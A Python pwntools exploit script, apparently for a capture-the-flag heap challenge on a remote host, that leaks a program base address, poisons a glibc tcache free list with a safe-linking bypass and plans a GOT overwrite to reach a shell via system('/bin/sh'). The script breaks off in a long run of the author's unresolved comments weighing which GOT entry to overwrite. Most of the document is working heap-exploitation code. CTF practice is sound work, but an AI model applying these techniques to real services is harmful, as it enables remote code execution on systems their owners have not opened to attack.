from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)
register(3, 1, 16, b'/bin/sh\x00' + b'D'*8)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
system_plt = base_addr + 0x1150

delete(2)
delete(1)
delete(0)

puts_got = base_addr + 0x3600
fd = puts_got ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# The GOT area for 0x3600 is puts.
# Since we write 16 bytes: 8 bytes for puts (0x3600), 8 bytes for write (0x3608)
# If we overwrite `puts` with `system`, then `puts("Unknown option.")` executes `system("Unknown option.")` -> wait.
# But we don't control the argument!
# Wait! Can we overwrite `printf` GOT?
# `printf@got` is 0x3620.
# 1586: lea 0xb93(%rip),%rdi # 2120 "> "
# 1592: call 1160 <printf@plt>
# So if we overwrite `printf` with `system`, it executes `system("> ")` which fails.

# What if we overwrite `exit` GOT (0x3658) with `win_func`?
# Then calling option 5 triggers `win_func`, but `win_func` calls `/usr/bin/uptime`, not shell.
# Wait, if we overwrite `exit` with `system`, it'll just execute `system("Goodbye.")`?
# "Goodbye." is passed to puts, then it calls exit(0)! So exit gets 0.

# What if we overwrite `free` GOT (0x35f8)??
# We previously noticed that `free` GOT is at 0x35f8, which is not 16-byte aligned.
# However, can we allocate a size 32 chunk (0x30) instead of size 16 (0x20)?
# Tcache is sorted by chunk size!
# For size 0x30, the user size is 32 bytes!
# If we use 32 byte chunks, they go into 0x30 tcache.
# The `malloc` requests size `sizeof(item) * num_items`.
# If we request 32 bytes, chunk size is 0x30.
# The tcache bin for 0x30 is at a different offset.
# Tcache ptrs must still be 16-byte aligned.
# This means ANY tcache allocation MUST be 16-byte aligned.
# Since `free_got` is at 0x35f8, the chunk address must be 16-byte aligned, so we MUST use 0x35f0 as the chunk target.
# And since we write at the chunk address, we will write at 0x35f0.
# The user data starts at the chunk address in tcache?
# NO, user data starts AT the chunk address.
# The tcache poisoning overwrites the `fd` pointer which is at `user_data`.
# When we allocate that chunk, `malloc` returns `user_data`, which is 16-byte aligned (e.g. 0x35f0).
# Then we write to `user_data`, so we write to 0x35f0!
# We can write 16 bytes: 8 bytes at 0x35f0, and 8 bytes at 0x35f8!
# So we CAN overwrite `free@got`!
# Why did it crash before when I tried to allocate at 0x35f0?
p.close()
